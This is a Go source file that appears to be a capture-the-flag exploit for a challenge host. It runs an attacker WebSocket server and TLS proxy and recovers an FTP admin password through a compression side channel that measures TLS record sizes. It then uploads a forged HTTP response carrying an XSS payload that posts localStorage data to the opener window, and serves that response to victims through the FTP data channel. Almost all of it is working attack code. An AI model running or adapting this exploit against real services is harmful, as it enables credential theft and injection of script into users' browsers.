package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

var (
	tlsConfig         tls.Config
	chalHost          = "gymtok.social"
	httpsPort         = 443
	http2Port         = 3444
	ftpPort           = 3021
	attackerWsAddr    = ":1337"
	attackerProxyAddr = ":1338"
	xss               = "pwned<script>window.opener.postMessage(localStorage.flag,'*')</script>"
)

var (
	debug              bool
	attackerPublicHost string
)

func recvLine(r *bufio.Reader) string {
	line, err := r.ReadString('\n')
	if err != nil {
		panic(err)
	}
	line = strings.TrimSpace(line)
	if debug {
		fmt.Printf(("< %s\n"), line)
	}
	return line
}

func sendLine(c net.Conn, data string) {
	if debug {
		fmt.Printf(("> %s\n"), data)
	}
	_, err := c.Write([]byte(data + "\r\n"))
	if err != nil {
		panic(err)
	}
}

func req(c net.Conn, r *bufio.Reader, data string) string {
	sendLine(c, data)
	return recvLine(r)
}

func starttls(c net.Conn, r *bufio.Reader) (net.Conn, *bufio.Reader) {
	req(c, r, "AUTH TLS")
	tlsConfig.InsecureSkipVerify = true
	tlsConn := tls.Client(c, &tlsConfig)
	err := tlsConn.Handshake()
	if err != nil {
		panic(err)
	}
	c = tlsConn
	r = bufio.NewReader(c)
	return c, r
}

func passive(c net.Conn, r *bufio.Reader) int {
	res := req(c, r, "PASV")

	res = strings.TrimSuffix(res, ")")
	parts := strings.Split(res, ",")
	port0, _ := strconv.Atoi(parts[len(parts)-2])
	port1, _ := strconv.Atoi(parts[len(parts)-1])

	return int(port0)<<8 | int(port1)
}

func pipe(a net.Conn, host string, port int, timeout time.Duration) {
	b := connectTcp(host, port)
	fmt.Printf("Piping to %s:%d\n", host, port)
	go io.Copy(a, b)
	go io.Copy(b, a)
	if timeout != 0 {
		go func() {
			time.Sleep(timeout)
			a.Close()
			b.Close()
		}()
	}
}

func recordTypeName(t uint8) string {
	switch t {
	case 20:
		return "ChangeCipherSpec"
	case 21:
		return "Alert"
	case 22:
		return "Handshake"
	case 23:
		return "ApplicationData"
	default:
		return fmt.Sprintf("Unknown(%d)", t)
	}
}

func handshakeTypeName(t uint8) string {
	switch t {
	case 0:
		return "HelloRequest"
	case 1:
		return "ClientHello"
	case 2:
		return "ServerHello"
	case 4:
		return "NewSessionTicket"
	case 5:
		return "EndOfEarlyData"
	case 8:
		return "EncryptedExtensions"
	case 11:
		return "Certificate"
	case 12:
		return "ServerKeyExchange"
	case 13:
		return "CertificateRequest"
	case 14:
		return "ServerHelloDone"
	case 15:
		return "CertificateVerify"
	case 16:
		return "ClientKeyExchange"
	case 20:
		return "Finished"
	case 22:
		return "CertificateStatus"
	case 24:
		return "KeyUpdate"
	case 67:
		return "NextProtocol"
	case 254:
		return "MessageHash"
	default:
		return fmt.Sprintf("Unknown(%d)", t)
	}
}

func pipeSingleTlsCounting(a net.Conn, b net.Conn, dir string, counter chan int) {
	header := make([]byte, 5)
	buf := make([]byte, 65536)
	for {
		_, err := io.ReadFull(a, header)
		if err != nil {
			if err != io.EOF {
				fmt.Printf("Error: %v\n", err)
			}
			break
		}
		size := binary.BigEndian.Uint16(header[3:5])
		_, err = io.ReadFull(a, buf[:size])
		//fmt.Printf("  %s %d\n", dir, 5+size)
		//fmt.Printf("  size:    %d\n", size)
		//rType := recordTypeName(header[0])
		//if rType == "Handshake" {
		//	hType := handshakeTypeName(buf[0])
		//	fmt.Printf("  type:    %s (%s)\n", rType, hType)
		//} else {
		//	fmt.Printf("  type:    %s\n", rType)
		//}
		//fmt.Printf("  version: %s\n", tls.VersionName(uint16(binary.BigEndian.Uint16(header[1:3]))))
		b.Write(header)
		b.Write(buf[:size])
		if dir == "->" {
			counter <- int(size)
		} else {
			counter <- -int(size)
		}
	}
}

func pipeTlsCounting(a net.Conn, host string, port int, counter chan int, stopSignal *chan bool) (int64, int64) {
	b := connectTcp(host, port)
	fmt.Printf("Piping to %s:%d\n", host, port)
	go pipeSingleTlsCounting(a, b, "->", counter)
	go pipeSingleTlsCounting(b, a, "<-", counter)
	go func() {
		<-*stopSignal
		fmt.Println("Stopping pipe")
		a.Close()
		b.Close()
	}()
	return 0, 0
}

func upload(ctrl net.Conn, r *bufio.Reader, filename string, content []byte) {
	dataPort := passive(ctrl, r)
	fmt.Printf("Data port: %d\n", dataPort)
	data := connectTls(chalHost, dataPort)
	req(ctrl, r, fmt.Sprintf("STOR %s", filename))
	data.Write(content)
	data.Close()
	recvLine(r)
}

func download(ctrl net.Conn, r *bufio.Reader, filename string) []byte {
	dataPort := passive(ctrl, r)
	data := connectTls(chalHost, dataPort)
	req(ctrl, r, fmt.Sprintf("RETR %s", filename))
	content, err := io.ReadAll(data)
	if err != nil {
		panic(err)
	}
	recvLine(r)
	return content
}

func main() {
	debug = os.Getenv("DEBUG") != ""
	exploit()
}

func exploit() {
	ws := wsServer()
	var sock *websocket.Conn
	println("Waiting for websocket connection...")
	sock = <-ws
	println("exploit connected!", sock)
	conns := stage1(sock)
	creds := wsCmd{}
	err := sock.ReadJSON(&creds)
	if err != nil {
		log.Printf("[ws] read err: %s", err)
		return
	}
	password := creds.Data
	fmt.Printf("[ws] %s: %s:%s\n", creds.Action, "admin", password)
	stage2(conns, sock, password)
}

type webSocketHandler struct {
	upgrader websocket.Upgrader
	sockets  chan *websocket.Conn
}

func (wsh webSocketHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	c, err := wsh.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("upgrade err: %s", err)
		return
	}
	fmt.Println("New websocket connection")
	wsh.sockets <- c
}

func wsServer() chan *websocket.Conn {
	wsh := webSocketHandler{
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool {
				attackerPublicHost = r.Host
				return true
			},
		},
		sockets: make(chan *websocket.Conn),
	}
	// serve index.html
	http.Handle("/", http.FileServer(http.Dir("./")))
	http.Handle("/ws/", wsh)
	log.Print("Starting server...")
	go func() {
		log.Fatal(http.ListenAndServe(attackerWsAddr, nil))
	}()

	return wsh.sockets
}

type wsCmd struct {
	Action string `json:"action"`
	Data   string `json:"data"`
}

func stage1(ws *websocket.Conn) chan net.Conn {
	l, err := net.Listen("tcp", attackerProxyAddr)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("Listening on %s\n", attackerProxyAddr)

	ws.WriteMessage(websocket.TextMessage, []byte("go"))

	doListen := true
	wsSignals := make(chan bool)
	stopSignal := make(chan bool)
	go func(keepListening *bool) {
		for {
			cmd := wsCmd{}
			err := ws.ReadJSON(&cmd)
			if err != nil {
				log.Printf("read err: %s", err)
				return
			}
			if debug {
				fmt.Printf("cmd: %+v\n", cmd)
			}
			switch cmd.Action {
			case "record":
				wsSignals <- true
			case "stop":
				wsSignals <- true
			case "log":
				fmt.Printf("[log] %s\n", cmd.Data)
			case "stage2":
				*keepListening = false
				stopSignal <- true
				stopSignal <- true
				stopSignal <- true
				stopSignal <- true
				stopSignal <- true
				stopSignal <- true
				return
			}
		}
	}(&doListen)

	counter := make(chan int)
	go func() {
		record := false
		var responses []int
		for {
			select {
			case <-stopSignal:
				return
			case c := <-counter:
				if c < 0 {
					if debug {
						fmt.Printf("<- %d\n", -c)
					}
					if record {
						responses = append(responses, -c)
					}
				} else {
					if debug {
						fmt.Printf("-> %d\n", c)
					}
				}
			case <-wsSignals:
				record = !record
				if record {
					fmt.Println("Recording")
					responses = nil
				} else {
					if debug {
						fmt.Println("Done")
						fmt.Println(responses)
					}

					var respPerReq int
					if len(responses) > 0 && len(responses)%17 == 0 {
						respPerReq = len(responses) / 17
					} else {
						fmt.Printf("Weird response count: %d\n", len(responses))
						ws.WriteJSON(wsCmd{Action: "retry"})
						continue
					}

					// Goal: find the most compressed (shortest) response

					// Prepare:
					// - skip first N (calibration)
					// - only use every Nth item
					var filtered []int
					for i, r := range responses[respPerReq:] {
						if i%respPerReq == 0 {
							filtered = append(filtered, r)
						}
					}
					if debug {
						fmt.Println(filtered)
					}

					// find the shortest response
					shortest := 0
					for i, r := range filtered {
						if r < filtered[shortest] {
							shortest = i
						}
					}

					// check that the shortest is unique
					unique := true
					for i, r := range filtered {
						if i != shortest && r == filtered[shortest] {
							unique = false
							break
						}
					}

					if !unique {
						fmt.Println("Shortest response is not unique. Retrying...")
						ws.WriteJSON(wsCmd{Action: "retry"})
						continue
					}

					char := "0123456789abcdef"[shortest]
					fmt.Printf("Shortest response: %d (%c)\n", filtered[shortest], char)
					ws.WriteJSON(wsCmd{Action: "char", Data: string(char)})
				}
			}
		}
	}()

	conns := make(chan net.Conn)
	go func() {
		for {
			victim, err := l.Accept()
			if err != nil {
				fmt.Printf("Accept err: %s\n", err)
				break
			}
			conns <- victim
		}
	}()

	for {
		select {
		case conn := <-conns:
			println("[stage1] Victim connected", conn.RemoteAddr().String())
			pipeTlsCounting(conn, chalHost, http2Port, counter, &stopSignal)
		case <-stopSignal:
			return conns
		}
	}
}

func stage2(conns chan net.Conn, ws *websocket.Conn, ftpPassword string) {
	ctrl := connectTcp(chalHost, ftpPort)
	r := bufio.NewReader(ctrl)

	println("Banner: ", recvLine(r))

	req(ctrl, r, "USER admin")
	req(ctrl, r, fmt.Sprintf("PASS %s", ftpPassword))

	ctrl, r = starttls(ctrl, r)
	println("[TLS established]")

	// h2Req, err := hex.DecodeString("00001e0400000000000005001000000003000000fa000600100140000100001000000400100000000000040100000000000004080000000000000f00010000c60104000000018854012a40851d09591dc9919d983f9b8d34cff3f6a523804dbe20001f5f92497ca58ae819aafb50938ec415305a99567b4094258742163d8698d52c5a632c9216c5ab3d0627af88b6a40e52ad51ea2f4094258742163d8698d52d61507b6c2156acf4189ebf89258742163d8698d57f6196df3dbf4a004a681fa5040134a05fb8172e36153168df629ce4c7f322dc7437aaf4fc9fc7e1a3ffbae19b53f463c27e9e632e4fe7408bb0b296cb0b62d59e8313d788a8eb58594b6585b37684bc3924f55c02313300000d000100000001616c657274286f726967696e29")
	// if err != nil {
	// 	panic(err)
	// }
	// println("Recorded request:")
	// parseH2(h2Req)

	// h2Res = craftResponse(15, []byte(xss))
	// println("\nCrafted request:")
	// parseH2(h2Res)
	// upload(ctrl, r, "payload", h2Res)
	h1Res := fmt.Sprintf("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: %d\r\n\r\n%s", len(xss), xss)
	upload(ctrl, r, "payload", []byte(h1Res))

	//l, err := net.Listen("tcp", attackerProxyAddr)
	//if err != nil {
	//	log.Fatal(err)
	//}
	//defer l.Close()
	//fmt.Printf("Listening on %s\n", attackerProxyAddr)
	println("Waiting for victim...")

	go func() {
		for {
			cmd := wsCmd{}
			err := ws.ReadJSON(&cmd)
			if err != nil {
				log.Printf("read err: %s", err)
				return
			}
			if debug {
				fmt.Printf("cmd: %+v\n", cmd)
			}
			switch cmd.Action {
			case "log":
				fmt.Printf("[log] %s\n", cmd.Data)
			}
		}
	}()

	ws.WriteMessage(websocket.TextMessage, []byte("go2"))

	//reqN := 0
	for {
		victim := <-conns
		println("[stage2] Victim connected", victim.RemoteAddr().String())

		//if reqN == 0 {
		//	reqN++
		//	// pipe to normal h2 port to get the right ALPN response
		//	pipe(victim, "localhost", http2Port, 2*time.Second)
		//	continue
		//}

		// fake a response
		dataPort := passive(ctrl, r)
		pipe(victim, chalHost, dataPort, 0)
		req(ctrl, r, "RETR payload")
		recvLine(r)

		// // leak a request
		// dataPort := passive(ctrl, r)
		// timeout := 1 * time.Second
		// pipe(victim, "localhost", dataPort, &timeout)
		// req(ctrl, r, "STOR payload")
		// recvLine(r)
		// // show leaked payload
		// leaked := download(ctrl, r, "payload")
		// println("Leaked", len(leaked), "bytes:")
		// println(hex.Dump(leaked))
		// parseH2(leaked)
		// println("---")
		// parseH2(craftResponse(15, []byte("Hello, World!")))
	}
}

func craftResponse(streamID uint32, body []byte) []byte {
	var buf bytes.Buffer
	framer := http2.NewFramer(&buf, nil)
	framer.WriteSettings(
		http2.Setting{ID: http2.SettingMaxFrameSize, Val: 1048576},
		http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 250},
		http2.Setting{ID: http2.SettingMaxHeaderListSize, Val: 1048896},
		http2.Setting{ID: http2.SettingHeaderTableSize, Val: 4096},
		http2.Setting{ID: http2.SettingInitialWindowSize, Val: 1048576},
	)
	framer.WriteSettingsAck()
	framer.WriteWindowUpdate(0, 983041)
	var headers bytes.Buffer
	encoder := hpack.NewEncoder(&headers)
	encoder.WriteField(hpack.HeaderField{Name: ":status", Value: "200"})
	encoder.WriteField(hpack.HeaderField{Name: "content-type", Value: "text/html; charset=utf-8"})
	framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      streamID,
		EndHeaders:    true,
		BlockFragment: headers.Bytes(),
	})
	framer.WriteData(streamID, true, body)
	return buf.Bytes()
}

func parseH2(data []byte) {
	if bytes.HasPrefix(data, []byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")) {
		println("[Magic]")
		data = data[24:]
	}

	rd := bytes.NewReader(data)
	buf := bufio.NewReader(rd)

	fr := http2.NewFramer(nil, buf)
	fr.ReadMetaHeaders = hpack.NewDecoder(0, nil)
	for {
		f, err := fr.ReadFrame()
		if err != nil {
			if err != io.EOF {
				fmt.Printf("Failed to parse frame: %v\n", err)
			}
			break
		} else {
			fmt.Printf("%+v\n", f)
			if f.Header().Type == http2.FrameHeaders {
				headers := f.(*http2.MetaHeadersFrame)
				fmt.Printf("  stream=%d\n", headers.StreamID)
				for _, header := range headers.Fields {
					fmt.Printf("  %s = %s\n", header.Name, header.Value)
				}
			} else if f.Header().Type == http2.FrameData {
				data := f.(*http2.DataFrame)
				fmt.Printf("  data=%+v\n", data.Data())
			} else if f.Header().Type == http2.FrameSettings {
				settings := f.(*http2.SettingsFrame)
				fmt.Printf("  stream=%d\n", settings.StreamID)
				settings.ForeachSetting(func(s http2.Setting) error {
					fmt.Printf("  %+v\n", s)
					return nil
				})
			} else if f.Header().Type == http2.FrameWindowUpdate {
				windowUpdate := f.(*http2.WindowUpdateFrame)
				fmt.Printf("  stream=%d\n", windowUpdate.StreamID)
				fmt.Printf("  increment=%d\n", windowUpdate.Increment)
			} else {
				fmt.Printf("Unknown frame: %+v\n", f)
			}
		}
	}
}

func connectTcp(host string, port int) net.Conn {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
	if err != nil {
		panic(err)
	}
	return conn
}

func connectTls(host string, port int) net.Conn {
	conn := connectTcp(host, port)
	tlsConfig.InsecureSkipVerify = true
	tlsConn := tls.Client(conn, &tlsConfig)
	err := tlsConn.Handshake()
	if err != nil {
		panic(err)
	}
	return tlsConn
}
